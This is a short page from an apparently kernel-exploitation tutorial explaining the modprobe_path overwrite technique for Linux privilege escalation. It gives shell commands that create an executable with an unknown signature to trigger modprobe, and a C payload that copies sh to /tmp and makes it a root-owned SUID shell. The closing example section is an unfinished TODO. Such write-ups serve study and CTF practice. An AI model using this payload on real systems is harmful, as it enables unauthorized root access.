---
description: A simple way to pop a shell
---

# Overwriting modprobe\_path

The kernel can request that a kernel module is loaded at runtime. If it does so, it will try to call [`request_module`](https://elixir.bootlin.com/linux/v6.16/source/kernel/module/kmod.c#L115), which will spawn the `modprobe` tool using [`call_modprobe`](https://elixir.bootlin.com/linux/v6.16/source/kernel/module/kmod.c#L71). `modprobe` is a userspace program that runs with root privileges, finds the required kernel module binary on filesystem and loads it.

The path to `modprobe` is in `modprobe_path`, a global variable in the kernel. We can read the value as a non-root user through `/proc/sys/kernel/modprobe`, with the default value being `/sbin/modprobe`.

If we can overwrite `modprobe_path` with another binary, e.g. `/tmp/exec`, this will be run with root privileges! That makes it **very** easy. To trigger modprobe, the easiest way is to execute a binary with an unknown signature:

```bash
echo -e '\xff\xff\xff\xff' > /tmp/fake
chmod +x /tmp/fake
/tmp/fake
```

To identify what program should be run to handle the signature, the kernel uses [`binfmt`](https://elixir.bootlin.com/linux/v6.1/source/fs/exec.c#L1742) (code is slightly different in newer versions). This is run by `request_module`, but the signature [must contain at least one non-printable character](https://elixir.bootlin.com/linux/v6.1/source/fs/exec.c#L1739).

The approach, therefore is simple. First compile a `/tmp/hijack` with source:

```c
int main()
{
    system("cp /usr/bin/sh /tmp/sh");
    system("chown root:root /tmp/sh");
    system("chmod 4755 /tmp/sh");
}
```

There are lots of possible payloads, but the end result is the same. This will copy `/bin/sh` to `/tmp/sh` and make it SUID. Now we create a file with an unknown signature:

```
echo -n -e '\xff\xff\xff\xff' > /tmp/fake
chmod +x /tmp/fake
```

Finally, overwrite `modprobe_path` to `/tmp/hijack`. When we execute `/tmp/fake` as a regular user, the kernel will spawn `/tmp/hijack` with root privileges and execute it!

## Example

TODO
